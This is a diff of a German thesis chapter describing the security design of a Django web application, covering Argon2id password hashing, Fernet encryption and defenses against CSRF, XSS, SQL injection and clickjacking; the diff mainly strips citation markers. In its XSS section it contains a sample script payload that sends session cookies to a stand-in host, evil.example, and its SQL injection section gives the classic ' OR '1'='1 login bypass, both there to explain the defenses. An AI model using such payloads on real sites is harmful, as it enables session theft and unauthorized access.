@@ -190,19 +190,19 @@ Für die Absicherung von Benutzerpasswörtern setzt #htl3r.long[diagnet] auf Arg
   ```
 ]
 
-Der zweite Eintrag dient der Rückwärtskompatibilität: Existierende Passwörter, die noch mit PBKDF2 gehasht wurden, können weiterhin verifiziert werden. Beim nächsten erfolgreichen Login wird das Passwort automatisch mit Argon2id neu gehasht @django-docs.
+Der zweite Eintrag dient der Rückwärtskompatibilität: Existierende Passwörter, die noch mit PBKDF2 gehasht wurden, können weiterhin verifiziert werden. Beim nächsten erfolgreichen Login wird das Passwort automatisch mit Argon2id neu gehasht.
 
 ==== Funktionsprinzip von Argon2
 
-Argon2 ist eine *Key Derivation Function* und gewann 2015 den Password Hashing Competition, der explizit nach einem Nachfolger für ältere Verfahren wie bcrypt und PBKDF2 suchte @rfc9106. Der entscheidende Unterschied zu diesen Vorgängern liegt darin, dass Argon2 nicht nur rechenintensiv, sondern auch gezielt *speicherintensiv* ist. Die Speicheranforderung lässt sich über den Parameter `memory_cost` in Kilobyte konfigurieren und ist fester Bestandteil der Algorithmusdefinition, nicht nachträgliche Optimierung @rfc9106.
+Argon2 ist eine *Key Derivation Function* und gewann 2015 den Password Hashing Competition, der explizit nach einem Nachfolger für ältere Verfahren wie bcrypt und PBKDF2 suchte @rfc9106. Der entscheidende Unterschied zu diesen Vorgängern liegt darin, dass Argon2 nicht nur rechenintensiv, sondern auch gezielt *speicherintensiv* ist. Die Speicheranforderung lässt sich über den Parameter `memory_cost` in Kilobyte konfigurieren und ist fester Bestandteil der Algorithmusdefinition, nicht nachträgliche Optimierung.
 
-Argon2 existiert in drei Varianten: Argon2d ist optimiert gegen GPU-Angriffe, Argon2i gegen Seitenkanalangriffe, und Argon2id kombiniert beide Ansätze @rfc9106. Djangos Implementierung verwendet standardmäßig Argon2id, was für allgemeine Passwort-Hashing-Zwecke die empfohlene Wahl ist @django-docs.
+Argon2 existiert in drei Varianten: Argon2d ist optimiert gegen GPU-Angriffe, Argon2i gegen Seitenkanalangriffe, und Argon2id kombiniert beide Ansätze. Djangos Implementierung verwendet standardmäßig Argon2id, was für allgemeine Passwort-Hashing-Zwecke die empfohlene Wahl ist.
 
-Die drei zentralen Kostparameter sind `time_cost` (Anzahl der Iterationen), `memory_cost` (Speicherbedarf in KiB) und `parallelism` (Anzahl paralleler Threads) @rfc9106. Die konkreten Mindestwerte für diese Parameter orientieren sich an den Empfehlungen der #htl3r.full[owasp] @owasp-password-storage. Ein Angreifer, der GPU-Hardware einsetzt, profitiert bei Argon2id weit weniger als bei rein rechenintensiven Verfahren: Grafikprozessoren verfügen zwar über tausende von Rechenkernen, aber über vergleichsweise wenig schnellen On-Chip-Speicher. Die Speicheranforderung von Argon2id zwingt jeden parallelen Angriff, diesen knappen Speicher zu belegen, was die effektiv nutzbare Parallelität drastisch reduziert @rfc9106.
+Die drei zentralen Kostparameter sind `time_cost` (Anzahl der Iterationen), `memory_cost` (Speicherbedarf in KiB) und `parallelism` (Anzahl paralleler Threads). Die konkreten Mindestwerte für diese Parameter orientieren sich an den Empfehlungen der #htl3r.full[owasp] @owasp-password-storage. Ein Angreifer, der GPU-Hardware einsetzt, profitiert bei Argon2id weit weniger als bei rein rechenintensiven Verfahren: Grafikprozessoren verfügen zwar über tausende von Rechenkernen, aber über vergleichsweise wenig schnellen On-Chip-Speicher. Die Speicheranforderung von Argon2id zwingt jeden parallelen Angriff, diesen knappen Speicher zu belegen, was die effektiv nutzbare Parallelität drastisch reduziert.
 
 ==== Warum nicht PBKDF2?
 
-PBKDF2-SHA256 ist der Django-Standard und kryptografisch nicht gebrochen, aber rein rechenintensiv und lässt sich auf moderner GPU-Hardware effizient parallelisieren @owasp-password-storage. Ein Angreifer mit einer Consumer-GPU kann PBKDF2-Hashes in einer Größenordnung von hunderten Millionen Versuchen pro Sekunde testen, sofern er Zugriff auf die Datenbank erlangt hat. Die Speicherbindung von Argon2id macht diesen Vorteil zunichte @rfc9106. Da `argon2-cffi` eine einzelne, stabile Abhängigkeit ohne eigene Transitivabhängigkeiten ist, überwiegt der Sicherheitsgewinn.
+PBKDF2-SHA256 ist der Django-Standard und kryptografisch nicht gebrochen, aber rein rechenintensiv und lässt sich auf moderner GPU-Hardware effizient parallelisieren. Ein Angreifer mit einer Consumer-GPU kann PBKDF2-Hashes in einer Größenordnung von hunderten Millionen Versuchen pro Sekunde testen, sofern er Zugriff auf die Datenbank erlangt hat. Die Speicherbindung von Argon2id macht diesen Vorteil zunichte. Da `argon2-cffi` eine einzelne, stabile Abhängigkeit ohne eigene Transitivabhängigkeiten ist, überwiegt der Sicherheitsgewinn.
 
 === Verschlüsselung von Gerätepasswörtern: Fernet <device_encryption>
 
@@ -212,7 +212,7 @@ Für diesen Zweck kommt `cryptography.fernet` zum Einsatz, eine Python-Bibliothe
 
 ==== Aufbau eines Fernet-Tokens
 
-Ein Fernet-Token ist kein roher Chiffretext, sondern ein strukturiertes, selbstbeschreibendes Format @fernet-spec. Jedes Token besteht aus den in @fernet_token_struktur aufgeführten Komponenten, die base64url-kodiert als einheitlicher String gespeichert werden:
+Ein Fernet-Token ist kein roher Chiffretext, sondern ein strukturiertes, selbstbeschreibendes Format. Jedes Token besteht aus den in @fernet_token_struktur aufgeführten Komponenten, die base64url-kodiert als einheitlicher String gespeichert werden:
 
 #figure(
   table(
@@ -234,7 +234,7 @@ Der Chiffretext wird mit *AES-128-CBC* erzeugt. Der 256-Bit-Fernet-Schlüssel wi
 
 ==== HMAC als Integritätssicherung
 
-Der #htl3r.short[hmac] am Ende des Tokens ist der entscheidende Unterschied zwischen reiner Verschlüsselung und *authentifizierter* Verschlüsselung @rfc2104. AES-CBC allein würde nur Vertraulichkeit bieten, aber keine Integrität: Ein Angreifer könnte Bits im Chiffretext verändern, und das System würde beim Entschlüsseln fehlerhafte Daten produzieren, ohne dies zu erkennen. Fernet löst dieses Problem durch #htl3r.short[hmac]-SHA256: Bevor entschlüsselt wird, verifiziert die Bibliothek den MAC kryptografisch gegen den gespeicherten Schlüssel @fernet-spec. Schlägt diese Verifikation fehl, wird eine `InvalidToken`-Exception geworfen; die Entschlüsselung beginnt gar nicht erst.
+Der #htl3r.short[hmac] am Ende des Tokens ist der entscheidende Unterschied zwischen reiner Verschlüsselung und *authentifizierter* Verschlüsselung @rfc2104. AES-CBC allein würde nur Vertraulichkeit bieten, aber keine Integrität: Ein Angreifer könnte Bits im Chiffretext verändern, und das System würde beim Entschlüsseln fehlerhafte Daten produzieren, ohne dies zu erkennen. Fernet löst dieses Problem durch #htl3r.short[hmac]-SHA256: Bevor entschlüsselt wird, verifiziert die Bibliothek den MAC kryptografisch gegen den gespeicherten Schlüssel. Schlägt diese Verifikation fehl, wird eine `InvalidToken`-Exception geworfen; die Entschlüsselung beginnt gar nicht erst.
 
 In der `_decrypt_value`-Methode des `Device`-Modells wird genau dieses Verhalten genutzt:
 
@@ -309,24 +309,24 @@ Neben der Absicherung gespeicherter Daten muss eine Webanwendung auch gegen akti
 
 Bei einem #htl3r.full[csrf]-Angriff bringt eine fremde Website einen bereits authentifizierten Benutzer dazu, ungewollt eine Anfrage an die Zielanwendung zu stellen, etwa durch ein verstecktes Formular, das beim Laden der Seite automatisch abgeschickt wird @owasp-top10. Da der Browser die Session-Cookies automatisch mitschickt, kann der Server die Anfrage nicht anhand der Cookies von einer legitimen unterscheiden.
 
-Django begegnet diesem Angriff mit dem `CsrfViewMiddleware`-Token-Verfahren @django-security. Bei jeder serverseitig gerenderten Seite wird ein kryptografisch zufälliger Token in ein verstecktes Formularfeld (`{% csrf_token %}`) eingebettet. Dieser Token ist an die Session des Benutzers gebunden. Eingehende POST-, PUT- und DELETE-Anfragen werden abgelehnt, wenn der Token fehlt oder nicht mit dem session-gebundenen Wert übereinstimmt. Eine externe Website kann diesen Token nicht auslesen, da die Same-Origin-Policy des Browsers den JavaScript-Zugriff auf Inhalte fremder Domains unterbindet.
+Django begegnet diesem Angriff mit dem `CsrfViewMiddleware`-Token-Verfahren. Bei jeder serverseitig gerenderten Seite wird ein kryptografisch zufälliger Token in ein verstecktes Formularfeld (`{% csrf_token %}`) eingebettet. Dieser Token ist an die Session des Benutzers gebunden. Eingehende POST-, PUT- und DELETE-Anfragen werden abgelehnt, wenn der Token fehlt oder nicht mit dem session-gebundenen Wert übereinstimmt. Eine externe Website kann diesen Token nicht auslesen, da die Same-Origin-Policy des Browsers den JavaScript-Zugriff auf Inhalte fremder Domains unterbindet.
 
 In den Templates von #htl3r.long[diagnet] ist `{% csrf_token %}` in jedem Formular eingebunden, beginnend beim Login-Formular bis hin zu allen zustandsverändernden Operationen wie dem Anlegen oder Löschen von Geräten.
 
 ==== Cross-Site Scripting
 
-#htl3r.full[xss]-Angriffe zielen darauf ab, schadhaften JavaScript-Code in die Ausgabe einer Webanwendung einzuschleusen, der dann im Browser anderer Benutzer ausgeführt wird @owasp-top10. Im einfachsten Fall könnte ein Angreifer einen Hostnamen wie `<script>document.location='https://evil.example/steal?c='+document.cookie</script>` in das Namensfeld eines Geräts eintragen. Würde dieser Wert ungefiltert in eine HTML-Seite eingebettet, könnten die Session-Cookies aller Benutzer, die diese Seite aufrufen, an einen Angreifer übermittelt werden.
+#htl3r.full[xss]-Angriffe zielen darauf ab, schadhaften JavaScript-Code in die Ausgabe einer Webanwendung einzuschleusen, der dann im Browser anderer Benutzer ausgeführt wird. Im einfachsten Fall könnte ein Angreifer einen Hostnamen wie `<script>document.location='https://evil.example/steal?c='+document.cookie</script>` in das Namensfeld eines Geräts eintragen. Würde dieser Wert ungefiltert in eine HTML-Seite eingebettet, könnten die Session-Cookies aller Benutzer, die diese Seite aufrufen, an einen Angreifer übermittelt werden.
 
-Django verhindert dies durch automatisches HTML-Escaping in seiner Template-Engine @django-security. Jede Variable, die mit `{{ variable }}` ausgegeben wird, wird standardmäßig escaped: `<` wird zu `&lt;`, `>` zu `&gt;` und `"` zu `&quot;`. Der oben genannte Angriffsversuch würde damit als harmloser Klartext im Browser angezeigt, nicht als ausführbarer Code. In #htl3r.long[diagnet] kommt der `safe`-Filter, der das Escaping explizit deaktiviert, in keinem Template vor.
+Django verhindert dies durch automatisches HTML-Escaping in seiner Template-Engine. Jede Variable, die mit `{{ variable }}` ausgegeben wird, wird standardmäßig escaped: `<` wird zu `&lt;`, `>` zu `&gt;` und `"` zu `&quot;`. Der oben genannte Angriffsversuch würde damit als harmloser Klartext im Browser angezeigt, nicht als ausführbarer Code. In #htl3r.long[diagnet] kommt der `safe`-Filter, der das Escaping explizit deaktiviert, in keinem Template vor.
 
 ==== SQL-Injection
 
-Bei einer #htl3r.short[sql]-Injection-Attacke werden benutzerkontrollierte Eingaben ungefiltert in #htl3r.short[sql]-Abfragen eingebettet, was einem Angreifer ermöglicht, die Abfragelogik zu verändern @owasp-top10. Der klassische Angriff `' OR '1'='1` in einem Login-Formular würde eine naiv implementierte Authentifizierungsabfrage aushebeln und Zugriff ohne gültige Credentials gewähren.
+Bei einer #htl3r.short[sql]-Injection-Attacke werden benutzerkontrollierte Eingaben ungefiltert in #htl3r.short[sql]-Abfragen eingebettet, was einem Angreifer ermöglicht, die Abfragelogik zu verändern. Der klassische Angriff `' OR '1'='1` in einem Login-Formular würde eine naiv implementierte Authentifizierungsabfrage aushebeln und Zugriff ohne gültige Credentials gewähren.
 
-Da #htl3r.long[diagnet] ausschließlich Djangos #htl3r.short[orm] für Datenbankoperationen einsetzt und an keiner Stelle rohe #htl3r.short[sql]-Strings mit Benutzerinhalten konkateniert werden, ist dieser Angriffsvektor ausgeschlossen. Das #htl3r.short[orm] verwendet intern *Prepared Statements* mit parametrisierten Queries @django-security, bei denen die Datenbank Abfragestruktur und Benutzerdaten als vollständig getrennte Elemente erhält. Die Datenbank-Engine interpretiert Benutzereingaben damit nicht als #htl3r.short[sql]-Code, unabhängig von deren Inhalt.
+Da #htl3r.long[diagnet] ausschließlich Djangos #htl3r.short[orm] für Datenbankoperationen einsetzt und an keiner Stelle rohe #htl3r.short[sql]-Strings mit Benutzerinhalten konkateniert werden, ist dieser Angriffsvektor ausgeschlossen. Das #htl3r.short[orm] verwendet intern *Prepared Statements* mit parametrisierten Queries, bei denen die Datenbank Abfragestruktur und Benutzerdaten als vollständig getrennte Elemente erhält. Die Datenbank-Engine interpretiert Benutzereingaben damit nicht als #htl3r.short[sql]-Code, unabhängig von deren Inhalt.
 
 ==== Clickjacking und HTTP-Sicherheitsheader
 
-Djangos `XFrameOptionsMiddleware` setzt den HTTP-Response-Header `X-Frame-Options: DENY`, der dem Browser mitteilt, dass die Anwendung nicht in einem `<iframe>` eingebettet werden darf @django-security. Dieser Schutz verhindert sogenannte Clickjacking-Angriffe, bei denen eine legitime Seite unsichtbar über einer manipulierten Seite überlagert wird, um Benutzerklicks abzufangen @owasp-top10. Da #htl3r.long[diagnet] keine einbettbaren Inhalte anbietet, ist diese Einschränkung ohne funktionalen Nachteil.
+Djangos `XFrameOptionsMiddleware` setzt den HTTP-Response-Header `X-Frame-Options: DENY`, der dem Browser mitteilt, dass die Anwendung nicht in einem `<iframe>` eingebettet werden darf. Dieser Schutz verhindert sogenannte Clickjacking-Angriffe, bei denen eine legitime Seite unsichtbar über einer manipulierten Seite überlagert wird, um Benutzerklicks abzufangen. Da #htl3r.long[diagnet] keine einbettbaren Inhalte anbietet, ist diese Einschränkung ohne funktionalen Nachteil.
 
 Die `SecurityMiddleware` setzt bei korrekt konfiguriertem TLS zusätzlich den `Strict-Transport-Security`-Header, der den Browser anweist, ausschließlich HTTPS-Verbindungen zu dieser Domain zuzulassen. Da #htl3r.long[diagnet] in Produktivumgebungen hinter einem Reverse Proxy mit TLS-Terminierung betrieben wird, greift dieser Mechanismus dort vollständig.
